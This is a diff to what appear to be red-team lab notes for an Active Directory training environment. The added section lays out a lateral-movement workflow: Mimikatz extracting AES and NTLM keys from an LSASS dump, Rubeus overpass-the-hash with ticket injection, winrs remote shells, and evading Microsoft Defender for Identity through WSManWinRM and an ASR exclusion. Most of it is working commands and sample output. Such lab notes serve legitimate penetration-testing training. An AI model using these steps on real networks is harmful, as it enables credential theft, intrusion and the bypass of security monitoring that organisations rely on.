@@ -2301,17 +2301,72 @@ Invoke-Mimikatz -Command "sekurlsa::evasive-keys"
 - Function embedded in file = No external dot-sourcing dependency
 - Direct invocation at script end = Executes without CLM restrictions
 
-### Lateral Movement Evasion
+### Lateral Movement via Dumped Credentials
 
-#### WSManWinRM Alternative (vs winrs detection)
+**Workflow: LSASS Dump → Credential Extraction → Overpass-the-Hash → Lateral Move**
+
+#### Step 1: Extract Credentials from Minidump
 ```powershell
-# Instead of winrs (detected by MDI)
-C:\AD\Tools\WSManWinRM.exe eu-sqlx.domain.com 
-  "cmd /c whoami > \\attacker\share\out.txt"
+# Use Mimikatz to read the reversed dump file
+C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentsharex\reversex.dmp" "sekurlsa::ekeys" "exit"
 
-# Set ASR exclusion for detection bypass:
-# Add "C:\AD\Tools" to ASR exclusion list
+# Output shows:
+# User Name: dbadmin
+# Domain: EU.EUROCORP.LOCAL
+# aes256_hmac: ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
+# rc4_hmac_nt: 0553b02b95f64f7a3c27b9029d105c27
 ```
+
+#### Step 2: Overpass-the-Hash with Compromised User
+```powershell
+# Create process with compromised user's credentials (AES256 preferred)
+Rubeus.exe asktgt 
+  /user:dbadmin 
+  /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
+  /domain:eu.eurocorp.local
+  /dc:eu-dc.eu.eurocorp.local
+  /opsec
+  /createnetonly:C:\Windows\System32\cmd.exe
+  /show
+  /ptt
+
+# Output: Process spawned as dbadmin with TGT injected
+```
+
+#### Step 3A: Traditional Lateral Movement (Detected by MDI)
+```powershell
+# Use winrs from the impersonated process
+winrs -r:eu-sqlx.eu.eurocorp.local cmd
+
+# Verify context
+C:\Users\dbadmin> set username
+USERNAME=dbadmin
+
+# WARNING: MDI detects winrs usage
+```
+
+#### Step 3B: Evasion-Friendly Lateral Movement (MDI Evasion)
+
+**Problem:** winrs is detected by MDI.
+
+**Solution:** Use WSManWinRM.exe with ASR exclusion bypass
+```powershell
+# Set ASR exclusion in registry (requires admin on attacker machine)
+# Add "C:\AD\Tools" to ASR exclusion list via GPO or registry
+
+# Then execute commands via WSManWinRM (not detected by MDI)
+C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c set username"
+
+# Output redirection (limited but functional)
+C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c dir >> \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\out.txt"
+
+# Note: If return code is 0 (000001C1F2FD2AC8), command failed silently
+```
+
+**Why WSManWinRM Works for Evasion:**
+- MDI doesn't have signature for WSManWinRM
+- ASR exclusion of "C:\AD\Tools" bypasses "Block process creations originating from PSExec and WMI" rule
+- Command execution still works, just limited output visibility
 
 ### MDE/MDI Bypass for LSASS Dumping
 
